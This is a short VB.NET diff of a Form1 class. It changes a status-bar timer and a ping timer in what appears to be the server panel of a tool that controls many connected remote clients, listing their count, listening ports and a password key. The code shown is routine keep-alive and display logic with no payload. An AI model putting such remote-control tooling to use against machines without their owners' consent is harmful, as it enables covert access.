@@ -180,7 +180,7 @@ Public Class Form1
 
     Private Sub Timer_Status_Tick(sender As Object, e As EventArgs) Handles Timer_Status.Tick
         Try
-            ToolStripStatusLabel1.Text = String.Format("Total Clients [{0}]       Selected Clients [{1}]       Listening Ports [{2}]       Password [{3}]", LV1.Items.Count.ToString, LV1.SelectedItems.Count.ToString, String.Join(",", Settings.Ports.ToList), Settings.KEY)
+            ToolStripStatusLabel1.Text = String.Format("Total Clients [{0}]       Selected Clients [{1}]       Listening Ports [{2}]       Password [{3}]", Settings.Online.Count.ToString, LV1.SelectedItems.Count.ToString, String.Join(",", Settings.Ports.ToList), Settings.KEY)
             Text = Settings.VER + "  " + DateTime.Now
         Catch ex As Exception
             Debug.WriteLine("Timer_Status " + ex.Message)
@@ -188,16 +188,11 @@ Public Class Form1
     End Sub
 
     Private Sub Timer_Ping_Tick(sender As Object, e As EventArgs) Handles Timer_Ping.Tick
-        If LV1.Items.Count > 0 Then
-            Try
-
-                For Each C As ListViewItem In LV1.Items
-                    Dim ClientReq As New Outcoming_Requests(C.Tag, CByte(PacketHeader.Ping))
-                    Pending.Req_Out.Add(ClientReq)
-                Next
-            Catch ex As Exception
-                Debug.WriteLine("Timer_Ping " + ex.Message)
-            End Try
+        If (Settings.Online.Count > 0) Then
+            For Each CL As Client In Settings.Online.ToList
+                Dim ClientReq As New Outcoming_Requests(CL, CByte(PacketHeader.Ping))
+                Pending.Req_Out.Add(ClientReq)
+            Next
         End If
     End Sub
 
